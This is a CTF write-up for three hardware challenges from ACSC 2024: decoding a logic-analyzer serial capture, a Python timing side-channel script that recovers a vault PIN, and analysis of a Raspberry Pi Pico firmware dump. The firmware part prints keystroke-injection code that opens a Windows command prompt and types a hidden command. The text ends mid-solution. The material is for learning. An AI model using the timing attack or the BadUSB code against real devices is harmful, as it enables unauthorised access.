Solved 3/5 hardware challenges. ᕙ(⇀‸↼‶)ᕗ

# Challenge 1: An4lyz3_1t [WARM-UP]
50 points, 140 solves 

## 📁 Challenge Description
>Our surveillance team has managed to tap into a secret serial communication and capture a digital signal using a Saleae logic analyzer. Your objective is to decode the signal and uncover the hidden message.

## 🚩 Solution

We have been given a `chall.sal` file. After acknowledging that there are no easy wins in the file, head your way and download the [Saleae logic analyzer](https://www.saleae.com/pages/downloads) (if you haven't yet) as the description says.

After importing the challenge file, we observed that only **D4** channel contains information. At first, I was so traumatized that I thought it was some binary challenges (`'0's`, `'1's`). However, it seems like it is not the case.

The tool has a built-in analyzer. Choose **Async Serial** analyzer where **D4** should be selected as the input channel. By doing some trials and errors, the bit rate is the deciding factor as different bit rates return different results where the correct flag data has also been returned. Set the bit rate to around `57600` bits/s and the others remain the same.

The image below indicates this characteristic where *red* and *blue* are bit rates `57600` bits/s and `115200` bits/s respectively. In definition, higher bit rates give more accurate data. However, it still depends on the dataset.

In the **Data** section, we can retrieve the flag by switching to Terminal mode. We may see many flags have been returned due to the flag signal appearing multiple times in the same channel.

# Challenge 2: Vault
150 points, 68 solves

## 📁 Challenge Description
>Can you perform a side-channel attack on this vault? The PIN is a 10-digit number.
>
>Python3 is installed on remote. `nc vault.chal.2024.ctf.acsc.asia 9999`

## 🚩 Solution

The author is kind enough to provide the executable binary file or else the instance is in trouble. As we entered an incorrect PIN, the error returned "*It didn't take me any time to verify that it's not the pin*".

```
$ ./chall                          
<<VAULT banner>>
Enter your PIN: 1234567890
Access Denied
 It didn't take me any time to verify that it's not the pin
```

After googling a bit, I found **"Time-Based Side Channel Attack"** which is highly related to the error message. 

The binary checks each number in the PIN from left to right. If the number is incorrect, it takes less time to check and react instantly whereas it takes slightly longer when it hits a correct number.

Here is an illustration:
```python
#!/usr/bin/env python3
import time, os
TEST_COUNT = 6
PIN_LENGTH = 10
CHOICES = "0123456789"
p = ''

for i in CHOICES:
  test = p+i+'0'*(PIN_LENGTH-len(p)-1)
  temp = 0
  for _ in range(TEST_COUNT):
    start = time.time()
    os.system(f"echo '{test}' | ./chall > /dev/null")
    temp += (time.time()-start)
  avgtime = temp/TEST_COUNT
  print(f"{test}: {avgtime}")
```

The Python code above checks the first number of the PIN and returns the average time of each number. We know that all the PINs are incorrect, but it leaks some useful information which the digit `8` on the first position uses a slightly longer time to finish compared to other digits. 

This indicates we may attempt to launch the same attack on other digits of the PIN.

```
0000000000: 0.17087074120839438
1000000000: 0.17525823911031088
2000000000: 0.16864744822184244
3000000000: 0.17492890357971191
4000000000: 0.16827436288197836
5000000000: 0.1625486214955648
6000000000: 0.16210401058197021
7000000000: 0.1681519349416097
8000000000: 0.3278968334197998
9000000000: 0.16546150048573813
```

From here, we optimize the code by defining a checker function. The code will keep moving on to the next number if a correct number is found.

Hence, we can print out the whole 10-digit PIN.

```python
#!/usr/bin/env python3
import time, os

TEST_COUNT = 6
PIN_LENGTH = 10
CHOICES = '0123456789'

def checker(p):
    maxtime = -1
    res = ''
    for i in CHOICES:
        test = p+i+'0'*(PIN_LENGTH-len(p)-1)
        temp = 0
        for _ in range(TEST_COUNT):
            start = time.time()
            os.system(f"echo '{test}' | ./chall > /dev/null")
            temp += (time.time()-start)
        avgtime = temp/TEST_COUNT
        if avgtime > maxtime:
            maxtime = avgtime
            res = i
    return res

def main():
    p = ''
    for i in range(PIN_LENGTH):
        c = checker(p)
        p += c
        print(f"[+] Finding: {p}")
    print(f"[+] PIN Found!: {p}")
    os.system(f"echo '{p}' | ./chall")

if __name__ == '__main__':
    main()
```

Run the code and we get,

```
$ python3 sol.py 
[+] Finding: 8
[+] Finding: 85
[+] Finding: 857
[+] Finding: 8574
[+] Finding: 85742
[+] Finding: 857421
[+] Finding: 8574219
[+] Finding: 85742193
[+] Finding: 857421936
[+] Finding: 8574219362
[+] PIN Found!: 8574219362
<<VAULT banner>>
Enter your PIN:
flag: ACSC{b377er_d3L4y3d_7h4n_N3v3r}
```

However, this is not the actual flag. Connect the instance to get the flag.

# Challenge 3: picopico
200 points, 55 solves

## 📁 Challenge Description
>Security personnel in our company have spotted a suspicious USB flash drive. They found a Raspberry Pi Pico board inside the case, but no flash drive board. Here's the firmware dump of the Raspberry Pi Pico board. Could you figure out what this 'USB flash drive' is for?

## 🚩 Solution
We had been given a `firmware.bin` file. When we tried to `strings` the file, it did not give any direct flags but it gave us a suspicious Python code at the end instead.

```python
import storage
storage.disable_usb_drive()
import time
L=len
o=bytes
l=zip
import microcontroller
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
w=b"\x10\x53\x7f\x2b"
a=0x04
K=43
if microcontroller.nvm[0:L(w)]!=w:
 microcontroller.nvm[0:L(w)]=w
 O=microcontroller.nvm[a:a+K]
 h=microcontroller.nvm[a+K:a+K+K]
 F=o((kb^fb for kb,fb in l(O,h))).decode("ascii")
 S=Keyboard(usb_hid.devices)
 C=KeyboardLayoutUS(S)
 time.sleep(0.1)
 S.press(Keycode.WINDOWS,Keycode.R)
 time.sleep(0.1)
 S.release_all()
 time.sleep(1)
 C.write("cmd",delay=0.1)
 time.sleep(0.1)
 S.press(Keycode.ENTER)
 time.sleep(0.1)
 S.release_all()
 time.sleep(1)
 C.write(F,delay=0.1)
 time.sleep(0.1)
 S.press(Keycode.ENTER)
 time.sleep(0.1)
 S.release_all()
time.sleep(0xFFFFFFFF)
```

This code looks confusing quite a bit, but what it does is it performs an XOR operation by using the contents in the `firmware.bin`, starting from the fourth bytes. The flag should be stored somewhere in the memory I believe.

Here is a simplified version of the code:

```python
a=4
K=43
w=microcontroller.nvm[0:4]
O=microcontroller.nvm[a:a+K]
h=microcontroller.nvm[a+K:a+K+K]
F=bytes((kb^fb for kb,fb in zip(O,h))).decode("ascii")
# press WindowsKey+R --> write "cmd" --> open cmd --> write F in cmd --> sleep
```

By looking at it, `O` and `h` are the important values. 

Hence, I write a script to reverse back the XOR operation as XOR is reversible. I am using the same variables based on the Python code above (as I have no idea what the variables are ¯\_(ツ)_/¯) and it works god damn!

```python
#!/usr/bin/env python3
from tqdm import tqdm

nvm = open('./firmware.bin', 'rb').read()
K = 43

for a in tqdm(range(len(nvm))):
    O = nvm[a+4:a+4+K]
    h = nvm[a+4+K:a+4+K+K]
    res = []
    for i in range(K):
        try:
            xor = O[i] ^ h[i]
            res.append(xor)
        except IndexError:
            print("Completed!")
            exit()
    if b'ACSC' in bytes(res):
        print(bytes(res))
```

```
